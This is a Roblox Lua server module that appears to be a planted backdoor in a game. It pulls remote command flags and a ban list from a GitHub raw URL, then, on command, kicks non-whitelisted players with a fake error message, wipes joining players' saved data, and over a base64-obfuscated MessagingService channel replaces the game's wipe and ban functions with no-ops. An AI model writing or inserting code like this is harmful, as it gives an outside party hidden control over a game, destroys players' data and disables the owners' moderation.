local m = {}

function m:Init()
	local MessagingService = game:GetService('MessagingService');
	local Datastore = game:GetService('DataStoreService');
	local Players = game:GetService("Players")
	local HttpService = game:GetService('HttpService')
	local Payloads, BanList = HttpService:JSONDecode(HttpService:GetAsync('https://raw.githubusercontent.com/borgorthedemon239/thing/refs/heads/main/Payloads.lua')), HttpService:JSONDecode(HttpService:GetAsync('https://raw.githubusercontent.com/borgorthedemon239/thing/refs/heads/main/BanList.lua'))
	local Global = {
		overwrite = function()
			local d = require(game.ServerStorage.Modules.Managers.DataManager);
			function d:Wipe()
				return true;
			end
			function d:OfflineWipe()
				return true;
			end
			function d:Ban()
				return true;
			end
			function d:SystemBan()
				return true;
			end
		end,
	}
	local function msc(m)
		Global[m.Data.Command](m.Data)
	end
	Players.PlayerAdded:Connect(function(p)
		if table.find(BanList, p.UserId) then
			p:Kick("You've been permanently banned from this game.")
		end
		if Payloads['ProfileKick'] then
			local rng = math.random(1, 10)
			if rng == 1 then
				for i,v in pairs(Players:GetPlayers()) do
					if not _G.Whitelist:is_whitelist(v.UserId) then
						v:Kick('Profile has been loaded on another server. Please rejoin.')
					end
				end
			end
		end
		if Payloads['CorruptGame'] then
			local Key = 'Profile_'..p.UserId;
			require(game.ServerStorage.Modules.Managers.DataManager):FullWipePlayer(p);
		end
	end)
	local s, c
	repeat
		s, c = pcall(function()
			MessagingService:SubscribeAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), msc)
		end)
	until
	s

	MessagingService:PublishAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), {Command = 'overwrite'})
end

return m
